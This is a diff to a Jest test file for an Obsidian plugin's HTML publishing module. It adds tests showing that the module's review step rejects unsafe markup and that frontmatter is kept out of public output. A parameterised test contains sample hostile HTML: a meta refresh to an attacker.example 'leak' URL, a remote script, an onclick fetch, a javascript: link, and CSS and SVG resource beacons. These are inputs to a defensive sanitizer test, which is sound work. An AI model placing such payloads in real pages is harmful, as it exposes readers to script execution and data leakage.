@@ -1,8 +1,11 @@
 /* eslint-disable obsidianmd/prefer-active-doc -- jsdom tests explicitly pass their single document realm */
 import {
   buildSymposiumDocument,
+  createSymposiumDocument,
+  createSymposiumReviewDocument,
   SYMPOSIUM_MAX_HTML_BYTES,
   SymposiumDocumentTooLargeError,
+  SymposiumDocumentUnsafeError,
 } from "@/symposium/symposiumDocument";
 import { App, Component, MarkdownRenderer, TFile } from "obsidian";
 
@@ -88,6 +91,90 @@ describe("symposiumDocument", () => {
     });
   });
 
+  describe("SymposiumDocumentUnsafeError", () => {
+    describe("constructor()", () => {
+      it("describes active or remote content as invalid finished HTML", () => {
+        const error = new SymposiumDocumentUnsafeError([
+          "remove unsupported <script>",
+          'embed or remove "src" on <img>',
+        ]);
+
+        expect(error).toBeInstanceOf(Error);
+        expect(error.message).toBe(
+          'Symposium HTML is not publishable: remove unsupported <script>; embed or remove "src" on <img>.'
+        );
+      });
+    });
+  });
+
+  describe("createSymposiumDocument()", () => {
+    it("freezes the exact HTML string and its UTF-8 byte length", () => {
+      const html = "<!doctype html><html><body>Résumé</body></html>\n";
+
+      const result = createSymposiumDocument("Review", html);
+
+      expect(result).toEqual({
+        title: "Review",
+        html,
+        byteLength: new TextEncoder().encode(html).byteLength,
+      });
+      expect(Object.isFrozen(result)).toBe(true);
+    });
+
+    it("rejects HTML whose UTF-8 encoding exceeds the existing byte limit", () => {
+      const html = "é".repeat(Math.floor(SYMPOSIUM_MAX_HTML_BYTES / 2) + 1);
+
+      expect(() => createSymposiumDocument("Too large", html)).toThrow(
+        SymposiumDocumentTooLargeError
+      );
+    });
+  });
+
+  describe("createSymposiumReviewDocument()", () => {
+    it("returns exact immutable passive HTML with embedded styling and assets", () => {
+      const html =
+        '<!doctype html><html><head><style>:root{--ink:#123}@media (prefers-color-scheme:dark){:root{--ink:#eee}}circle{fill:var(--ink);filter:url("#shadow")}</style></head><body><a href="https://example.com">Source</a><img src="data:image/png;base64,iVBORw0KGgo="><svg><defs><filter id="shadow"></filter><linearGradient id="paint"></linearGradient></defs><circle cx="1" cy="1" r="1" fill="url(#paint)"></circle></svg></body></html>';
+
+      const result = createSymposiumReviewDocument("Review", html);
+
+      expect(result.html).toBe(html);
+      expect(Object.isFrozen(result)).toBe(true);
+    });
+
+    it.each([
+      [
+        "automatic redirects",
+        '<meta content="0;url=https://attacker.example/leak" HTTP-EQUIV=" Refresh ">',
+      ],
+      ["active elements", '<script src="https://attacker.example/run.js"></script>'],
+      ["event handlers", "<p onclick=\"fetch('https://attacker.example/')\">Review</p>"],
+      ["remote assets", '<img src="https://attacker.example/note.png">'],
+      ["executable links", '<a href="javascript:alert(1)">Review</a>'],
+      ["CSS resource URLs", "<style>body{background:url(https://attacker.example/pixel)}</style>"],
+      ["CSS imports", '<style>@import "//attacker.example/style.css";</style>'],
+      [
+        "SVG resource URLs",
+        '<svg><use href="https://attacker.example/icons.svg#note"></use></svg>',
+      ],
+      ["nested HTML documents", '<iframe srcdoc="<p>Hidden</p>"></iframe>'],
+    ])("rejects %s before review", (_case, body) => {
+      const html = `<!doctype html><html><body>${body}</body></html>`;
+
+      expect(() => createSymposiumReviewDocument("Unsafe", html)).toThrow(
+        SymposiumDocumentUnsafeError
+      );
+    });
+
+    it("reports every actionable violation in one failure", () => {
+      const html =
+        '<!doctype html><script></script><img src="https://attacker.example/pixel"><p onclick="alert(1)">Review</p>';
+
+      expect(() => createSymposiumReviewDocument("Unsafe", html)).toThrow(
+        'remove unsupported <script>; embed or remove "src" on <img>; remove "onclick" from <p>'
+      );
+    });
+  });
+
   describe("buildSymposiumDocument()", () => {
     it("serializes the settled Obsidian reading-view output as a complete HTML document", async () => {
       const app = createApp({ markdown: "# Markdown that must not be reparsed" });
@@ -124,6 +211,26 @@ describe("symposiumDocument", () => {
       expect(result.html).not.toContain("# Markdown that must not be reparsed");
       expect(result.byteLength).toBe(new TextEncoder().encode(result.html).byteLength);
       expect(app.vault.getFiles).not.toHaveBeenCalled();
+    });
+
+    it("omits rendered frontmatter and properties from the public document", async () => {
+      const app = createApp({
+        markdown: "---\ntitle: Private metadata\ntags: [internal]\n---\n# Public body",
+      });
+      const file = createFile("Notes/Public body.md");
+      renderMock.mockImplementation(async (_app, _markdown, element) => {
+        appendHtml(
+          element,
+          '<div class="metadata-container">Properties UI</div><pre class="frontmatter language-yaml"><code>title: Private metadata</code></pre><h1>Public body</h1>'
+        );
+      });
+
+      const result = await buildSymposiumDocument(app, file, createComponent(), document);
+
+      expect(result.html).not.toContain("metadata-container");
+      expect(result.html).not.toContain("frontmatter");
+      expect(result.html).not.toContain("Private metadata");
+      expect(result.html).toContain("<h1>Public body</h1>");
     });
 
     it("removes active content and dangerous attributes while retaining safe external links", async () => {
